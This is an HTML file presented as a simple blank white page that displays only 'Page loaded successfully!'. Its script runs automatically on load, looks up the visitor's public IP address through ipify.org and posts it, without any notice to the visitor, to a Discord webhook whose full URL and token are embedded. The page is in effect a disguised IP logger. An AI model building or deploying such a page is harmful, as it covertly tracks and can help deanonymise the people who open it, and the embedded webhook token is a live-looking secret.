<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple White Page</title>
    <style>
        body {
            background-color: white;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }
        .message {
            color: #333;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="message">Page loaded successfully!</div>

    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1462954759173439570/4Pa4_ofFtn8e7x1xlWX_XGS-GxwBHDYhH7IzhrEGOgsBwWszDlxNiJ0dHKg-DpnCJQ3L';
        const IP_API_URL = 'https://api.ipify.org?format=json';

        async function trackPageView() {
            try {
                const ipResponse = await fetch(IP_API_URL);
                if (!ipResponse.ok) {
                    throw new Error(`IP API error: ${ipResponse.status}`);
                }

                const ipData = await ipResponse.json();
                const ip = ipData.ip || 'Unknown';

                const embedPayload = {
                    content: 'Page viewed!',
                    embeds: [{
                        title: 'VIEWED',
                        color: 0x00FF00,
                        fields: [
                            { name: 'IP Address', value: `\`${ip}\``, inline: true },
                            { name: 'Detected via', value: 'ipify.org (public IP only)', inline: false }
                        ],
                        timestamp: new Date().toISOString(),
                        footer: { text: 'Tracked via Webhook' }
                    }]
                };

                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embedPayload)
                });

            } catch (error) {
                const errorPayload = {
                    content: 'Tracking error!',
                    embeds: [{
                        title: 'IP Logged (Error)',
                        description: error.message,
                        color: 0xFF0000,
                        timestamp: new Date().toISOString()
                    }]
                };

                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(errorPayload)
                }).catch(() => {});
            }
        }

        window.addEventListener('load', trackPageView);
    </script>
</body>
</html>
